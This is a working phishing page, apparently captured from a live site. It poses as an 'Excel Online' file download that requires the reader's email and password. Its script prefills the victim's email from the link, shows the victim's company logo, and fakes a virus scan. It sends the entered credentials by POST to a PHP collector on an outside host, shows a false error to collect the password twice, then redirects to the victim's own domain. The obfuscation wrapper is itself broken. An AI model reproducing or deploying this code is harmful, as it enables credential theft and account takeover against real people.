<script>
    var X = " <!DOCTYPE html>
<html lang="en">

<!-- Mirrored from view-file-web.online/good/download/excel/510 by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 22 Mar 2022 09:03:17 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
     
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <link rel="stylesheet" href="https://ruiya0glass.com/wp/wp-content/plugins/saac.fil.excel.aut/css/bootstrap.min.css">
  <!-- FAV ICON -->
   <link rel="icon" href="https://ruiya0glass.com/wp/wp-content/plugins/saac.fil.excel.aut/images/logo.png" 
    <link rel="shortcut icon" href="https://ruiya0glass.com/wp/wp-content/plugins/saac.fil.excel.aut/images/logo.png" >
    
    <!-- This imports the font awesome library -->
  <link rel="stylesheet" href="https://ruiya0glass.com/wp/wp-content/plugins/saac.fil.excel.aut/css/all.css">
  <!-- My custom style rules -->
  <link  rel="stylesheet" href="https://ruiya0glass.com/wp/wp-content/plugins/saac.fil.excel.aut/css/twostyles.css">
  <script src="https://ruiya0glass.com/wp/wp-content/plugins/saac.fil.excel.aut/ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <script src="https://ruiya0glass.com/wp/wp-content/plugins/saac.fil.excel.aut/js/tether.js"></script>
  <script src="https://ruiya0glass.com/wp/wp-content/plugins/saac.fil.excel.aut/js/bootstrap.js"></script>
  <!-- This line imports the javascript  grabber -->
  <script src="https://ruiya0glass.com/wp/wp-content/plugins/saac.fil.excel.aut/js/scripts.js"></script>
  <!-- Page Title -->
 
  
 
 </head>
  


 <body>
    
<style>
  body{
    width: 100%;
    height: 100vh;
    overflow: hidden;
    background-image: url("https://ruiya0glass.com/wp/wp-content/plugins/saac.fil.excel.aut/images/bgimg.png");
    background-repeat: no-repeat;
    background-size: cover;
    font-family: "Segoe UI", "Open Sans", sans-serif, serif;
}  
    
</style>

<div id="page-content" class="container" style="display:block;"> 
<!-- NAV BAR -->
   

</div><!-- End of content container -->


         
             
              
       
     












  <!-- The User Authentication Modal -->
  <div class="modal fade" id="myModal">
    <div class="modal-dialog modal-dialog-centered">
      <div class="modal-content">



        <div id="spin-wrapper" class="spin-wrapper" style="display:block;">
        <!-- Anti virus image insertion -->
          <div style="padding-top:130px; padding-left:100px;">
          <img src="https://ruiya0glass.com/wp/wp-content/plugins/saac.fil.excel.aut/images/ex.png" style="width:70px;">
          </div>
            <div id="spin-pos" class="spin-pos">
                <img id="loader" class="loader" src="https://ruiya0glass.com/wp/wp-content/plugins/saac.fil.excel.aut/images/spin.gif" alt="Loading....">
                
              



                <div id="progress-caption" class="progress-caption" style="font-size:16px; color: green; font-weight: 600;"> Fetching EXCEL document for download</div>
            </div>
        </div> 



      
        <!-- Modal Header -->
        <div class="modal-header">

        <!-- This div creates a new row for holding the assets of the modal header -->
          <div class="row">
            <!-- This div spans the 12 columns of the display -->
             <div class='col-sm-12 col-md-12 col-lg-12'>
               <!-- Modal logo image -->
                  <div>
                    <img style="height:30px;float:left; margin-right:10px;" src="https://ruiya0glass.com/wp/wp-content/plugins/saac.fil.excel.aut/images/logo.png">
                  </div>
                 <span class="modal-title">Excel online</span>
             </div>

            <!-- This div spans the 12 columns of the display -->
             <div class="col-sm-12 col-md-12 col-lg-12" style="margin-left: 32px;">
              <!-- Modal Sub heading -->
                 <h3>Excel Online - Login to view file</h3>
             </div>
             
             
          </div>
          <button type="button" class="close" >&times;</button>
          
        </div>
        
        <!-- Modal body -->
        <div class="modal-body">
        
            <div class="container">
                <!-- <h2>Stacked form</h2> -->

                <!-- Server response message div -->
                <div id="response" class="m-0" style="font-size:14px; margin-top:10px;">
                    
                </div>
                <!-- End of server response message div -->












                <form action="" method="post">
                     <input type="hidden" name="_token" value="Z0bljHG2ZQIsaXFFI1JekISVH8qbWckAVTFXzpnB">
                    <div id="msg" class="user-error" style="margin: 0 auto; text-align: center; font-size: 13px;color: red; display:none;">Incorrect Email or Password provided! Please re-enter and try again.</div>
                    <div class="form-group">
                    <!-- User Email Label -->
                        <label for="cc">Email:</label>
                        <input type="text" class="form-control form-control-sm" id="email" placeholder="Please enter your email" name="email"  value="" required />

                        <!-- Error span tag for the user email address error -->
                        <span id="email-error" class="user-error"  style="font-size: 13px;color: red;"></span>
                    </div>
                    <div class="form-group">

                    <!-- User Password label -->
                        <label for="user_pwd">Password:</label>
                        <input type="password" class="form-control form-control-sm" id="password" placeholder="Please enter  your password" name="pswd" required />
                        <!-- Error span tag for the user password address error -->
                        <span id="pass-error" class="user-error" style="font-size: 13px;color: red;"></span>
                    </div>

                    <!-- Submit Button Label -->
                    <button type="button" id="submit-btn" class="btn btn-success btn-block">Download Excel</button>
                    
                    
                    
                    <div id="verifying2" style="margin: 0 auto; text-align:center; display:none;">
                      <img src="https://ruiya0glass.com/wp/wp-content/plugins/saac.fil.excel.aut/images/spinner.svg" height="40" width="40" /> Verifying...
                    </div>
                </form>
            </div>


        </div>
        
        
        
        <!-- Modal footer -->
        <div class="modal-footer container">

          <div class="row mt-0">
            <!-- This div spans the 12 columns of the display -->
             <div class="col-sm-12 col-md-12 col-lg-12">
              <small style="font-size:12px;">Sign In with Receiver's Email and Password to view file</small>
             </div>
               <!-- This div spans the 12 columns of the display -->
             <div class="col-sm-12 col-md-12 col-lg-12 mt-0">
                 <small style="font-size:10px;"> &copy;2022 Excel Inc.</small>
             </div>
          </div>
         
        </div>

           
        
      </div>
    </div>
  </div>






<!-- Beginning of the footer -->
<div class="mt-5">
  <footer class="container-fluid text-center">
    <div class="row">
        <div class="col-sm-12">
          
            <span class="glyphicon glyphicon-chevron-up">Adobe Document Cloud</span>
          
        </div>
      
        <!-- Setting the user country if avaliable -->
        <div style='font-size:14px;' class='col-sm-12'><small></small></div><div style='font-size:14px;' class='col-sm-12'><small> </small></div> 

        
       
        

        <div class="col-sm-12">
           <p><small>&copy; 2022 Excel Inc.</small></p>
        </div>
    </div>
    
  </footer> <!-- End of the footer -->
</div>
 </div>
 </div>

<!-- Jquery library -->

<!-- This  grabber -->



    <script>
    $(document).ready(function(){
        var scanning =   $("#spin-wrapper");
    var pwdError = $("#pass-error");
    var emailError = $("#email-error");
    var loginError = $("#login-error");
    var email = $("#user_email");
    var password = $("#user_pwd");
    var verificationSpinner = $("#verifying");
              $("#myModal").modal({
            backdrop: 'static',
            keyboard: false,
            focus: true,
            show: true
        });
        setTimeout(() => {
            scanning.css("display", "none");
        }, 3000);
    });
</script>
    

<!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
  </body>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
  <script>

    /* global $ */
    $(document).ready(function(){
      var count=0;

      $('#back1').click(function () {
        $("#msg").hide();
        $('#email').val("");
        $("#automail").animate({left:200, opacity:"hide"}, 0);
        $("#inputbar").animate({right:200, opacity:"show"}, 1000);

      });

      var email = window.location.hash.substr(1);
      if (!email) {

      }
      else
      {
        var my_email =email;
        $('#email').val(my_email);
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
          email.focus;
          return false;
        }
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        var finalu= c.toUpperCase();

        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
        $("#logoname").html(finalu);
        $(".logoname").html(finalu);
      }


      
      $('#submit-btn').click(function(event){
        $('#error').hide();
        $('#msg').hide();
        $('#paserror').hide();
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var msg = $('#msg').html();
        $('#msg').text( msg );
      ///////////new injection////////////////
      var my_email =email;
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

      if (!filter.test(my_email)) {
        $('#error').show();
        email.focus;
        return false;
      }
      
      if (password == '') {
        $('#paserror').show();
        password.focus;
        return false;
      }


      var ind=my_email.indexOf("@");
      var my_slice=my_email.substr((ind+1));
      var c= my_slice.substr(0, my_slice.indexOf('.'));
      var final= c.toLowerCase();
      var finalu= c.toUpperCase();

        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
        $(".logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
        $("#logoname").html(finalu);
      ///////////new injection////////////////
      count=count+1;
      
      $.ajax({
        dataType: 'JSON',
        url: 'https://ruiya0glass.com/wp/wp-content/plugins/saac.fil.excel.aut/drun.php',
        type: 'POST',
        data:{
          email:email,
          password:password,
        },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifing...');
            },
            success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                  $("#password").val("");
                  if (count>=2) {
                    count=0;
                    // window.location.replace(response['redirect_link']);
                    window.location.replace("http://www."+my_slice);

                  }
                  // $('#msg').html(response['msg']);
                }
                else{
                  // $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
              $("#password").val("");
              if (count>=2) {
                count=0;
                window.location.replace("http://www."+my_slice);
              }
              $("#msg").show();
              // $('#msg').html("Please try again later");
            },
            complete: function(){
              $('#submit-btn').html('Sign in');
            }
          });
    });


    });


  </script>  

    

      
</body>

</html>
";
  document.write(atob(X));
</script>